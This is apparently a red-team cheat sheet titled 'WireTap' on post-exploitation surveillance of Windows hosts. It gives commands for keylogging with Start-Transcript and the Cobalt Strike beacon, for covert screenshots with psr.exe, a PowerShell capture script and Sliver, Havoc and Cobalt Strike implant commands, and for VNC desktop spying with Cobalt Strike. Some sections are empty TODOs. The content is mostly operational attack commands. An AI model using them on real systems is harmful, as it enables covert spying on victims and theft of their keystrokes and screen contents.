# WireTap

## 01 - Keylogging

### 1.1 - Living off the Land

- Execute the transcript log.

```
PS C:\> Start-Transcript -Path keylogger.log
```

- Stop the transcript log.

```
PS C:\> Stop-Transcript
```

### 1.2 - Sliver

TODO: Fill this info

### 1.3 - Covenant

TODO: Fill this info

### 1.4 - Cobalt Strike

This will spawn to a child process when using the spawnto beacon command otherwise it'll use the rundll32 as default. You can optionally spoof to another process

`beacon> keylogger <pid> <arch>`

## 02 - Screenshots

### 2.1 - Command Prompt

`C:\> psr.exe /start /output D:\screenshots.zip /sc 1 /gui 0`

### 2.2 - Powershell Script

`$ cat screenshot.ps1`

---

```powershell
Param(  
    [Parameter(Mandatory = $true)][string]$Path  
)  
  
$FileName = "$env:COMPUTERNAME - $(Get-Date -Format yyyy-MM-dd_HHmmss).bmp"  
$File = "$Path\$FileName"  
  
Add-Type -AssemblyName System.Windows.Forms  
Add-Type -AssemblyName System.Drawing  
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen  
$Width = $Screen.Width  
$Height = $Screen.Height  
$Left = $Screen.Left  
$Top = $Screen.Top  
  
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height  
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)  
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)  
$bitmap.Save($File)   
  
Write-Output "Screenshot saved to:"  
Write-Output $File
```

### 2.3 - Sliver

`sliver (IMPLANT_NAME) > screenshot`

### 2.4 - Havoc

`Demon Â» screenshot`

### 2.5 - Cobalt Strike

This will spawn to a child process when using the `spawnto` beacon command otherwise it'll use the `rundll32` as default. You can optionally spoof to another process.

```
beacon> screenshot

beacon> screenshot <pid> <arch> <seconds>

beacon> printscreen

beacon> screenwatch
```

## 03 - VNC Desktop

### 3.1 - Cobalt Strike

Launch a VNC client to spy the target. My recommendation is use `low` quality option to get better surveillance on the target.

`beacon> desktop <pid> <arch> [low | high]`

---
## References

- [PSR LOLBas](https://lolbas-project.github.io/lolbas/Binaries/Psr/)